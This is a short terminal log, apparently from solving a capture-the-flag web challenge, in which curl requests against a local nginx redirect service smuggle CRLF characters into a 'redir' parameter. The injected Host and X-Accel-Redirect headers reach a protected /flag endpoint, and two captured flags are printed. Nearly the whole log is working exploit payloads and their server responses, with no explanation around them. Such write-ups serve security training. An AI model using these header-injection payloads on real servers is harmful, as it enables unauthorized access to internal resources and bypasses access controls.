root@4a7a4f1905c6:/# curl "http://localhost:7778/?redir=http://web:7777/flagHTTP/1.1%0d%0aHeehee:" -v
*   Trying 127.0.0.1:7778...
* Connected to localhost (127.0.0.1) port 7778 (#0)
> GET /?redir=http://web:7777/flagHTTP/1.1%0d%0aHeehee: HTTP/1.1
> Host: localhost:7778
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 302 Found
< Server: nginx/1.25.3
< Date: Fri, 05 Jan 2024 16:46:34 GMT
< Location: http://localhost:7778/flagHTTP/1.1
< Transfer-Encoding: chunked
< Connection: keep-alive
< Heehee: 
< 
* Connection #0 to host localhost left intact
Hello world!


curl "http://localhost:7778/flag?redir=http://google.com/flag%20HTTP/1.1%0d%0aHost:%20web:7777%0d%0aAccept:%20*/*%0d%0a%0d%0a" -v


root@4a7a4f1905c6:/# curl http://web:7777/flag -v
*   Trying 192.168.80.3:7777...
* Connected to web (192.168.80.3) port 7777 (#0)
> GET /flag HTTP/1.1
> Host: web:7777
> User-Agent: curl/7.88.1
> Accept: */*
> 
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: BaseHTTP/0.6 Python/3.12.1
< Date: Fri, 05 Jan 2024 16:46:00 GMT
< 
* Closing connection 0
AIS3{C0PPer5mItHs_5H0R7_@d_a7T4Ck}

# http://localhost:7778/?redir=http://localhost:7778%0D%0AX-Accel-Redirec:%20http://localhost:7778/flag
# curl http://localhost:7778/?redir=http://localhost:7778%0D%0AX-Accel-Redirect:%20/flag
# AIS3{JUsT_s0m3_FuNNY_n91NX_fEatur3}